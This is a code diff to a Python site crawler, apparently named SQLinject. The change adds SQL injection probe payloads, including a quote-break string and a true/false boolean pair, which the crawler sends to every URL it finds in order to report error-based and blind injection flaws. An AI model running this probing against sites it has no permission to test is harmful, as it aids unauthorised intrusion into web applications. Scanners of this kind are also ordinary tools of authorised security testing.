@@ -4,7 +4,7 @@
 from urllib.parse import urljoin
 
 from bs4 import BeautifulSoup
-from SQLinject.lib.core import Download, sqlcheck, UrlManager
+from SQLinject.lib.core import Download, sqlcheck, UrlManager,Request
 import threading
 
 
@@ -14,6 +14,7 @@ class SpiderMain(object):
         self.download = Download.Downloader()
         self.root = root
         self.threadNum = threadNum
+        self.check = Request.request()
 
     def _judge(self, domain, url):
         if url.find(domain) != -1:
@@ -48,12 +49,20 @@ class SpiderMain(object):
                     break
                 new_url = self.urls.get_new_url()
                 ##sql check
-                try:
-                    if sqlcheck.sqlcheck(new_url):
-                        print("url:%s sqlcheck is valuable" % new_url)
-                except:
-                    pass
-                print("craw:" + new_url)
+                payloads = ["1' and 1 = 1 ", "kobe'+and+1%3D1+%23", "kobe'+and+1%3D2+%23", ]
+
+                if self.check.checkvul(new_url, payloads[0]):
+                    print("url:%s has a SQL vulnerability" % new_url)
+                elif self.check.is_eq_(new_url, payloads[1], payloads[2]):
+                    print("url:%s has a SQL blinds vulnerability" % new_url)
+
+                # if sqlcheck.sqlcheck(new_url):
+                #     print("url:%s sqlcheck is valuable" % new_url)
+                # try:
+                #
+                # except Exception:
+                #     print('Detection failed')
+                # print("craw:" + new_url)
                 t = threading.Thread(target=self.download.download, args=(new_url, _content))
                 t.start()
                 th.append(t)
